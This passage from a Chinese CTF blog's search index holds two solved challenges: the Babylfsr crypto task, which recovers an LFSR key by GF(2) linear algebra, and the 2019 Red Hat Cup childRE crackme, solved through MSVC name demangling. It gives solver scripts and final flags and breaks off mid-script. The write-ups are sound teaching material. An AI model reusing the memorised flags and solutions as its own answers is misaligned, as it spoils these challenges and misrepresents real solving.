[{"title":"Babylfsr","url":"/2022/09/12/Babylfsr/","content":"<h2 id=\"例题如下\">1. 例题如下</h2>\r\n<span id=\"more\"></span>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> hashlib</span><br><span class=\"line\"><span class=\"keyword\">from</span> secret <span class=\"keyword\">import</span> KEY,FLAG,MASK</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">assert</span>(FLAG==<span class=\"string\">&quot;de1ctf&#123;&quot;</span>+hashlib.sha256(<span class=\"built_in\">hex</span>(KEY)[<span class=\"number\">2</span>:].rstrip(<span class=\"string\">&#x27;L&#x27;</span>)).hexdigest()+<span class=\"string\">&quot;&#125;&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">assert</span>(FLAG[<span class=\"number\">7</span>:<span class=\"number\">11</span>]==<span class=\"string\">&#x27;1224&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">LENGTH = <span class=\"number\">256</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">assert</span>(KEY.bit_length()==LENGTH)</span><br><span class=\"line\"><span class=\"keyword\">assert</span>(MASK.bit_length()==LENGTH)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">pad</span>(<span class=\"params\">m</span>):</span><br><span class=\"line\">    pad_length = <span class=\"number\">8</span> - <span class=\"built_in\">len</span>(m)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> pad_length*<span class=\"string\">&#x27;0&#x27;</span>+m</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">lfsr</span>():</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self, init, mask, length</span>):</span><br><span class=\"line\">        self.init = init</span><br><span class=\"line\">        self.mask = mask</span><br><span class=\"line\">        self.lengthmask = <span class=\"number\">2</span>**(length+<span class=\"number\">1</span>)-<span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">next</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        nextdata = (self.init &lt;&lt; <span class=\"number\">1</span>) &amp; self.lengthmask </span><br><span class=\"line\">        i = self.init &amp; self.mask &amp; self.lengthmask </span><br><span class=\"line\">        output = <span class=\"number\">0</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> i != <span class=\"number\">0</span>:</span><br><span class=\"line\">            output ^= (i &amp; <span class=\"number\">1</span>)</span><br><span class=\"line\">            i = i &gt;&gt; <span class=\"number\">1</span></span><br><span class=\"line\">        nextdata ^= output</span><br><span class=\"line\">        self.init = nextdata</span><br><span class=\"line\">        <span class=\"keyword\">return</span> output</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__==<span class=\"string\">&quot;__main__&quot;</span>:</span><br><span class=\"line\">    l = lfsr(KEY,MASK,LENGTH)</span><br><span class=\"line\">    r = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">63</span>):</span><br><span class=\"line\">        b = <span class=\"number\">0</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">8</span>):</span><br><span class=\"line\">            b = (b&lt;&lt;<span class=\"number\">1</span>)+l.<span class=\"built_in\">next</span>()</span><br><span class=\"line\">        r += pad(<span class=\"built_in\">bin</span>(b)[<span class=\"number\">2</span>:])</span><br><span class=\"line\">    <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;output&#x27;</span>,<span class=\"string\">&#x27;w&#x27;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">        f.write(r)</span><br></pre></td></tr></table></figure>\r\n<p>另外给的信息为：</p>\r\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">001010010111101000001101101111010000001111011001101111011000100001100011111000010001100101110110011000001100111010111110000000111011000110111110001110111000010100110010011111100011010111101101101001110000010111011110010110010011101101010010100101011111011001111010000000001011000011000100000101111010001100000011010011010111001010010101101000110011001110111010000011010101111011110100011110011010000001100100101000010110100100100011001000101010001100000010000100111001110110101000000101011100000001100010</span><br></pre></td></tr></table></figure>\r\n<h2 id=\"分析\">2. 分析</h2>\r\n<p>分析程序，是一个普通的lfsr，但不知道初始KEY和MASK，需要利用给出的另一段信息（504bit），推出所需的MASK和KEY（分别都是256bit）。</p>\r\n<h3 id=\"求掩码\">求掩码</h3>\r\n<p>先考虑如何推出掩码。由于 lfsr 的性质，每一次生成的 bit 都会加到向量的最低位，同时丢弃掉最高位那个 bit. 于是在连续 256 次生成之后，原有的 KEY 所有的位都被丢弃，lfsr 的状态会转为我们已知的 256 个 bit —— 也就是题目所给出的串的前 256 位。从此之后，我们完全知道了 lfsr 的状态，只需要在已知状态的情况下推出掩码了。</p>\r\n<p>设初始KEY为<span class=\"math inline\">\\((a_{0},a_{1},\\cdots,a_{255})\\)</span>，MASK为<span class=\"math inline\">\\((m_0,m_1,\\cdots,m_{255})^{T}\\)</span>，<code>lfsr</code>运算如下： <span class=\"math display\">\\[ { \\begin{pmatrix} a_0&amp; a_1&amp; \\cdots &amp; a_{254} &amp; a_{255} \\\\ a_1&amp; a_2 &amp; \\cdots &amp; a_{255} &amp; o_0 \\\\ \\ddots \\\\ a_{255} &amp; o_0 &amp; \\cdots &amp; o_{253} &amp; o_{254} \\end{pmatrix} \\begin{pmatrix} m_0 \\\\ m_1 \\\\ \\vdots \\\\ m_{255} \\end{pmatrix} = \\begin{pmatrix} o_0 \\\\ o_1 \\\\ \\vdots \\\\ o_{255} \\end{pmatrix} } \\]</span></p>\r\n<p>上面是一个方程；而状态向量有 256 维，我们需要 256 组方程才能解出整个掩码向量。但我们现在只有 504 - 256 = 248 个方程可用，显然秩是不够用的。容易想到，直接猜测 lfsr 此后生成的 8 个 bit，于是就有 256 组方程了；</p>\r\n<p>解方程组的问题可以转化为矩阵求逆的问题。把 lfsr 的状态一行一行地写在矩阵上，形成的矩阵记为 <span class=\"math inline\">\\(A\\)</span> . 把 lsfr 每次所生成的结果也拼成一个向量，记为 <span class=\"math inline\">\\(O\\)</span>. 那么掩码向量 <span class=\"math inline\">\\(m\\)</span> 使得： <span class=\"math display\">\\[A\\cdot m = O\\]</span> 两边左乘 <span class=\"math inline\">\\(A^{-1}\\)</span>，可以得到掩码向量： <span class=\"math display\">\\[m = A^{-1}\\cdot O\\]</span></p>\r\n<p>爆破掩码脚本如下：</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> itertools</span><br><span class=\"line\"></span><br><span class=\"line\">x = <span class=\"string\">&#x27;001010010111101000001101101111010000001111011001101111011000100001100011111000010001100101110110011000001100111010111110000000111011000110111110001110111000010100110010011111100011010111101101101001110000010111011110010110010011101101010010100101011111011001111010000000001011000011000100000101111010001100000011010011010111001010010101101000110011001110111010000011010101111011110100011110011010000001100100101000010110100100100011001000101010001100000010000100111001110110101000000101011100000001100010&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">test</span>(<span class=\"params\">padding</span>):</span><br><span class=\"line\">    s = [<span class=\"built_in\">int</span>(i) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> x ] + padding</span><br><span class=\"line\">    M = matrix(GF(<span class=\"number\">2</span>), <span class=\"number\">256</span>, <span class=\"number\">256</span>)</span><br><span class=\"line\">    T = vector(GF(<span class=\"number\">2</span>), <span class=\"number\">256</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(s) - <span class=\"number\">256</span>):</span><br><span class=\"line\">        M[i] = s[i:i+<span class=\"number\">256</span>]</span><br><span class=\"line\">        T[i] = s[i+<span class=\"number\">256</span>]</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        mask = M.inverse() * T</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> mask</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> itertools.product([<span class=\"number\">0</span>,<span class=\"number\">1</span>], repeat=<span class=\"number\">8</span>):</span><br><span class=\"line\">    test(<span class=\"built_in\">list</span>(i))</span><br></pre></td></tr></table></figure>\r\n<h3 id=\"求key\">求KEY</h3>\r\n<p>接下来考虑求出初始状态 KEY. 我们目前有的东西是：（猜测的）连续 512 个 lfsr 输出，以及与之对应的掩码。注意到第 256 个输出，是由 KEY 的末位，拼接上前 255 个输出所形成的；第 255 个输出，是由 KEY 的倒数两位，拼接上前 254 个输出所形成的。我们可以先求出 KEY 的末位，再求出倒数第二位……以此类推，整个 KEY 就求出来了。</p>\r\n<p>完整脚本如下：</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> itertools</span><br><span class=\"line\"><span class=\"keyword\">import</span> hashlib</span><br><span class=\"line\"></span><br><span class=\"line\">x = <span class=\"string\">&#x27;001010010111101000001101101111010000001111011001101111011000100001100011111000010001100101110110011000001100111010111110000000111011000110111110001110111000010100110010011111100011010111101101101001110000010111011110010110010011101101010010100101011111011001111010000000001011000011000100000101111010001100000011010011010111001010010101101000110011001110111010000011010101111011110100011110011010000001100100101000010110100100100011001000101010001100000010000100111001110110101000000101011100000001100010&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">bitAnd</span>(<span class=\"params\">a,b</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">list</span>(<span class=\"built_in\">map</span>(<span class=\"keyword\">lambda</span> x,y: <span class=\"built_in\">int</span>(x) &amp; <span class=\"built_in\">int</span>(y), a,b))</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">bin2int</span>(<span class=\"params\">s</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> reduce(<span class=\"keyword\">lambda</span> x,y: x*<span class=\"number\">2</span> + y, s)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">test</span>(<span class=\"params\">padding</span>):</span><br><span class=\"line\">    s = [<span class=\"built_in\">int</span>(i) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> x ] + padding</span><br><span class=\"line\">    M = matrix(GF(<span class=\"number\">2</span>), <span class=\"number\">256</span>, <span class=\"number\">256</span>)</span><br><span class=\"line\">    T = vector(GF(<span class=\"number\">2</span>), <span class=\"number\">256</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(s) - <span class=\"number\">256</span>):</span><br><span class=\"line\">        M[i] = s[i:i+<span class=\"number\">256</span>]</span><br><span class=\"line\">        T[i] = s[i+<span class=\"number\">256</span>]</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        mask = M.inverse() * T</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span></span><br><span class=\"line\">    key = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">256</span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> bitAnd([<span class=\"number\">0</span>] + key + s[<span class=\"number\">0</span>:<span class=\"number\">255</span> - i], mask).count(<span class=\"number\">1</span>) % <span class=\"number\">2</span> == s[<span class=\"number\">255</span>-i]:</span><br><span class=\"line\">            key = [<span class=\"number\">0</span>] + key</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            key = [<span class=\"number\">1</span>] + key</span><br><span class=\"line\">    key = <span class=\"built_in\">hex</span>(bin2int(key))[<span class=\"number\">2</span>:]</span><br><span class=\"line\">    r = hashlib.sha256(key.encode()).hexdigest()</span><br><span class=\"line\">    <span class=\"keyword\">if</span> r[:<span class=\"number\">4</span>] == <span class=\"string\">&#x27;1224&#x27;</span>:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(r)</span><br><span class=\"line\">        <span class=\"keyword\">return</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> itertools.product([<span class=\"number\">0</span>,<span class=\"number\">1</span>], repeat=<span class=\"number\">8</span>):</span><br><span class=\"line\">    test(<span class=\"built_in\">list</span>(i))</span><br><span class=\"line\"><span class=\"comment\"># 1224473d5e349dbf2946353444d727d8fa91da3275ed3ac0dedeb7e6a9ad8619</span></span><br></pre></td></tr></table></figure>\r\n<blockquote>\r\n<p>注意，该题在sage下进行求解。</p>\r\n</blockquote>\r\n","categories":["CTF"],"tags":["crypto"]},{"title":"2019红帽杯 ChildRE","url":"/2022/09/16/2019%E7%BA%A2%E5%B8%BD%E6%9D%AF-ChildRE/","content":"<p>一道需要结合动态调试的题目，同时也补足了编译器<code>修饰</code>方面的知识，特此记录一下。</p>\r\n<h2 id=\"题目地址\">题目地址</h2>\r\n<p>题目地址在此 <a href=\"https://buuoj.cn/challenges#%5B2019%E7%BA%A2%E5%B8%BD%E6%9D%AF%5DchildRE\">[2019红帽杯]childRE</a></p>\r\n<h2 id=\"题目分析\">题目分析</h2>\r\n<p>使用DIE查看文件基本信息，为未加壳的PE64文件，拖入IDA中进行分析。</p>\r\n<p>首先定位到main函数，其内容如下：</p>\r\n<span id=\"more\"></span>\r\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __cdecl <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">const</span> <span class=\"type\">char</span> **argv, <span class=\"type\">const</span> <span class=\"type\">char</span> **envp)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  __int64 v3; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  _QWORD *v4; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"type\">const</span> CHAR *v5; <span class=\"comment\">// r11</span></span><br><span class=\"line\">  __int64 v6; <span class=\"comment\">// r10</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v7; <span class=\"comment\">// r9d</span></span><br><span class=\"line\">  <span class=\"type\">const</span> CHAR *v8; <span class=\"comment\">// r10</span></span><br><span class=\"line\">  __int64 v9; <span class=\"comment\">// rcx</span></span><br><span class=\"line\">  __int64 v10; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> v12; <span class=\"comment\">// ecx</span></span><br><span class=\"line\">  __int64 v13; <span class=\"comment\">// r9</span></span><br><span class=\"line\">  __int128 v14[<span class=\"number\">2</span>]; <span class=\"comment\">// [rsp+20h] [rbp-38h] BYREF</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">memset</span>(v14, <span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span>(v14));</span><br><span class=\"line\">  sub_7FF7DE301080(<span class=\"string\">&quot;%s&quot;</span>);                       <span class=\"comment\">// scanf v14</span></span><br><span class=\"line\">  v3 = <span class=\"number\">-1</span>i64;</span><br><span class=\"line\">  <span class=\"keyword\">do</span></span><br><span class=\"line\">    ++v3;</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( *((_BYTE *)v14 + v3) );</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v3 != <span class=\"number\">31</span> )                               <span class=\"comment\">// len(v14) == 31</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> ( <span class=\"number\">1</span> )</span><br><span class=\"line\">      Sleep(<span class=\"number\">0x3E8</span>u);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  v4 = sub_7FF7DE301280(v14);</span><br><span class=\"line\">  v5 = name;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v4 )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    sub_7FF7DE3015C0((<span class=\"type\">unsigned</span> __int8 *)v4[<span class=\"number\">1</span>]);</span><br><span class=\"line\">    sub_7FF7DE3015C0(*(<span class=\"type\">unsigned</span> __int8 **)(v6 + <span class=\"number\">16</span>));</span><br><span class=\"line\">    v7 = dword_7FF7DE3057E0;</span><br><span class=\"line\">    v5[dword_7FF7DE3057E0] = *v8;</span><br><span class=\"line\">    dword_7FF7DE3057E0 = v7 + <span class=\"number\">1</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  UnDecorateSymbolName(v5, outputString, <span class=\"number\">0x100</span>u, <span class=\"number\">0</span>);</span><br><span class=\"line\">  v9 = <span class=\"number\">-1</span>i64;</span><br><span class=\"line\">  <span class=\"keyword\">do</span></span><br><span class=\"line\">    ++v9;</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( outputString[v9] );</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v9 == <span class=\"number\">62</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v12 = <span class=\"number\">0</span>;</span><br><span class=\"line\">    v13 = <span class=\"number\">0</span>i64;</span><br><span class=\"line\">    <span class=\"keyword\">do</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( a1234567890Qwer[outputString[v13] % <span class=\"number\">23</span>] != a46200860044218[v13] )</span><br><span class=\"line\">        _exit(v12);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( a1234567890Qwer[outputString[v13] / <span class=\"number\">23</span>] != a55565653255552[v13] )</span><br><span class=\"line\">        _exit(v12 * v12);</span><br><span class=\"line\">      ++v12;</span><br><span class=\"line\">      ++v13;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> ( v12 &lt; <span class=\"number\">0x3E</span> );</span><br><span class=\"line\">    sub_7FF7DE301020(<span class=\"string\">&quot;flag&#123;MD5(your input)&#125;\\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v10 = sub_7FF7DE3018A0(<span class=\"built_in\">std</span>::<span class=\"built_in\">cout</span>);</span><br><span class=\"line\">    <span class=\"built_in\">std</span>::ostream::operator&lt;&lt;(v10, sub_7FF7DE301A60);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\r\n<p>开始逐步分析，最开始的代码如下，主要进行输入，并判断输入字符长度是否为31</p>\r\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">memset</span>(v14, <span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span>(v14));</span><br><span class=\"line\">sub_7FF7DE301080(<span class=\"string\">&quot;%s&quot;</span>);                       <span class=\"comment\">// scanf v14</span></span><br><span class=\"line\">v3 = <span class=\"number\">-1</span>i64;</span><br><span class=\"line\"><span class=\"keyword\">do</span></span><br><span class=\"line\">    ++v3;</span><br><span class=\"line\"><span class=\"keyword\">while</span> ( *((_BYTE *)v14 + v3) );</span><br><span class=\"line\"><span class=\"keyword\">if</span> ( v3 != <span class=\"number\">31</span> )                               <span class=\"comment\">// len(v14) == 31</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> ( <span class=\"number\">1</span> )</span><br><span class=\"line\">        Sleep(<span class=\"number\">0x3E8</span>u);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\r\n<p>接下来的代码对输入进行了变换，并调用了<code>UnDecorateSymbolName</code>函数，进入sub_7FF7DE301280 函数和 sub_7FF7DE3015C0 函数，发现其内部代码较为复杂，暂时先跳过。</p>\r\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">v4 = sub_7FF7DE301280(v14);</span><br><span class=\"line\">v5 = name;</span><br><span class=\"line\"><span class=\"keyword\">if</span> ( v4 )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    sub_7FF7DE3015C0((<span class=\"type\">unsigned</span> __int8 *)v4[<span class=\"number\">1</span>]);</span><br><span class=\"line\">    sub_7FF7DE3015C0(*(<span class=\"type\">unsigned</span> __int8 **)(v6 + <span class=\"number\">16</span>));</span><br><span class=\"line\">    v7 = dword_7FF7DE3057E0;</span><br><span class=\"line\">    v5[dword_7FF7DE3057E0] = *v8;</span><br><span class=\"line\">    dword_7FF7DE3057E0 = v7 + <span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">UnDecorateSymbolName(v5, outputString, <span class=\"number\">0x100</span>u, <span class=\"number\">0</span>);</span><br></pre></td></tr></table></figure>\r\n<p>接下来的代码流程较为简单，主要先判断outputString长度是否为62，然后对outputString的内容作为参数，与a1234567890Qwer数组、a46200860044218和a55565653255552数组进行判断，根据两个if语句可以还原出outputString的内容。</p>\r\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">v9 = <span class=\"number\">-1</span>i64;</span><br><span class=\"line\"><span class=\"keyword\">do</span></span><br><span class=\"line\">    ++v9;</span><br><span class=\"line\"><span class=\"keyword\">while</span> ( outputString[v9] );</span><br><span class=\"line\"><span class=\"keyword\">if</span> ( v9 == <span class=\"number\">62</span> )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    v12 = <span class=\"number\">0</span>;</span><br><span class=\"line\">    v13 = <span class=\"number\">0</span>i64;</span><br><span class=\"line\">    <span class=\"keyword\">do</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( a1234567890Qwer[outputString[v13] % <span class=\"number\">23</span>] != a46200860044218[v13] )</span><br><span class=\"line\">            _exit(v12);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( a1234567890Qwer[outputString[v13] / <span class=\"number\">23</span>] != a55565653255552[v13] )</span><br><span class=\"line\">            _exit(v12 * v12);</span><br><span class=\"line\">        ++v12;</span><br><span class=\"line\">        ++v13;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> ( v12 &lt; <span class=\"number\">0x3E</span> );</span><br><span class=\"line\">    sub_7FF7DE301020(<span class=\"string\">&quot;flag&#123;MD5(your input)&#125;\\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    v10 = sub_7FF7DE3018A0(<span class=\"built_in\">std</span>::<span class=\"built_in\">cout</span>);</span><br><span class=\"line\">    <span class=\"built_in\">std</span>::ostream::operator&lt;&lt;(v10, sub_7FF7DE301A60);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\r\n<p>最关键的部分在于中间部分代码，较为复杂，还不知道输入v14会对outputString有何影响，先进行动态调试一波，查看输入对outputString的影响，将断点断在<code>v9 = -1i64;</code>语句处，开始调试：</p>\r\n<p>首先输入<code>abcdefghijklmnopqrstuvwxyz12345</code>，运行结果如下：</p>\r\n<figure>\r\n<img src=\"/2022/09/16/2019%E7%BA%A2%E5%B8%BD%E6%9D%AF-ChildRE/image-20220916132100764.png\" alt=\"image-20220916132100764\"><figcaption aria-hidden=\"true\">image-20220916132100764</figcaption>\r\n</figure>\r\n<p>可以看到outputString的内容为<code>pqhrsidtujvwkebxylz1mf23n45ogca</code>，好像是对输入进行了置换操作。</p>\r\n<p>但此时存在一个问题，outputString的长度仍为31，不是62，无法满足第41行的if语句，在此就陷入了瓶颈。</p>\r\n<p>无奈只能上网浏览他人的wp，原来需要知道<code>UnDecorateSymbolName</code>函数的含义，能够<strong>反修饰指定已修饰的 C++ 符号名</strong>，将一个经过修饰后的函数名转换为原函数定义。</p>\r\n<blockquote>\r\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">DWORD` `WINAPI <span class=\"title function_\">UnDecorateSymbolName</span><span class=\"params\">(</span></span><br><span class=\"line\"><span class=\"params\">``_In_ ``PCTSTR` `DecoratedName,</span></span><br><span class=\"line\"><span class=\"params\">``_Out_ ``PTSTR` `UnDecoratedName,</span></span><br><span class=\"line\"><span class=\"params\">``_In_ ``DWORD` `UndecoratedLength,</span></span><br><span class=\"line\"><span class=\"params\">``_In_ ``DWORD` `Flags</span></span><br><span class=\"line\"><span class=\"params\">)</span>; </span><br></pre></td></tr></table></figure>\r\n<p>DecoratedName [输入]</p>\r\n<p>已修饰的 C++ 符号名。此名称能以始终为问号 (?) 的首字符鉴别。</p>\r\n<p>UnDecoratedName [输出]</p>\r\n<p>指向字符串缓冲区的指针，该缓冲区接收未修饰的名字。</p>\r\n<p>UndecoratedLength [输入]</p>\r\n<p>UnDecoratedName 缓冲区的大小，为字符数。</p>\r\n<p>Flags [输入]</p>\r\n<p>用于反修饰已修饰名称的方式的选项。</p>\r\n</blockquote>\r\n<p>然后需要从尾开始倒推，根据if语句的判断逆推出outputString的内容，编写出逆推脚本如下：</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">s1 = <span class=\"string\">&quot;1234567890-=!@#$%^&amp;*()_+qwertyuiop[]QWERTYUIOP&#123;&#125;asdfghjkl;&#x27;ASDFGHJKL:\\&quot;ZXCVBNM&lt;&gt;?zxcvbnm,.&quot;</span></span><br><span class=\"line\">a1 = <span class=\"string\">&#x27;(_@4620!08!6_0*0442!@186%%0@3=66!!974*3234=&amp;0^3&amp;1@=&amp;0908!6_0*&amp;&#x27;</span></span><br><span class=\"line\">a2 = <span class=\"string\">&#x27;55565653255552225565565555243466334653663544426565555525555222&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\">r = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0x3e</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> string.printable:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> s1[<span class=\"built_in\">ord</span>(c) % <span class=\"number\">23</span>] == a1[i] <span class=\"keyword\">and</span> s1[<span class=\"built_in\">ord</span>(c) // <span class=\"number\">23</span>] == a2[i]:</span><br><span class=\"line\">           r += c</span><br><span class=\"line\">           <span class=\"keyword\">break</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(r)</span><br><span class=\"line\"><span class=\"comment\"># private: char * __thiscall R0Pxx::My_Aut0_PWN(unsigned char *)</span></span><br></pre></td></tr></table></figure>\r\n<p>其中s1为a1234567890Qwer数组，a1和a2分别为a46200860044218数组和a55565653255552数组。还原出outputString内容为<code>private: char * __thiscall R0Pxx::My_Aut0_PWN(unsigned char *)</code>，因此得到函数原型，需要推导出经过修饰后的函数名，有关修饰的知识可参考<a href=\"https://www.cnblogs.com/starrysky77/p/8531413.html\">这篇文章</a>，经过手动转换，得到修饰后的函数名为<code>?My_Aut0_PWN@R0Pxx@@AAEPADPAE@Z</code></p>\r\n<p>至此，已经得到修饰后函数名，因此可以逆推出初始输入：</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">inp1 = <span class=\"string\">&quot;abcdefghijklmnopqrstuvwxyz12345&quot;</span></span><br><span class=\"line\">out1 = <span class=\"string\">&quot;pqhrsidtujvwkebxylz1mf23n45ogca.&quot;</span></span><br><span class=\"line\">ss = <span class=\"string\">&quot;?My_Aut0_PWN@R0Pxx@@AAEPADPAE@Z&quot;</span></span><br><span class=\"line\">flag = [<span class=\"number\">0</span>] * <span class=\"number\">31</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">31</span>):</span><br><span class=\"line\">    flag[inp1.find(out1[i])] = ss[i]</span><br><span class=\"line\">real_inp = <span class=\"string\">&#x27;&#x27;</span>.join(flag)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(real_inp)</span><br><span class=\"line\"><span class=\"comment\"># Z0@tRAEyuP@xAAA?M_A0_WNPx@@EPDP</span></span><br></pre></td></tr></table></figure>\r\n<p>再经过md5，可以得到flag为<code>flag&#123;63b148e750fed3a33419168ac58083f5&#125;</code>。</p>\r\n<p>将上述解题脚本组合起来，得到最终的解题脚本如下：</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\"><span class=\"keyword\">import</span> hashlib</span><br><span class=\"line\"></span><br><span class=\"line\">s1 = <span class=\"string\">&quot;1234567890-=!@#$%^&amp;*()_+qwertyuiop[]QWERTYUIOP&#123;&#125;asdfghjkl;&#x27;ASDFGHJKL:\\&quot;ZXCVBNM&lt;&gt;?zxcvbnm,.&quot;</span></span><br><span 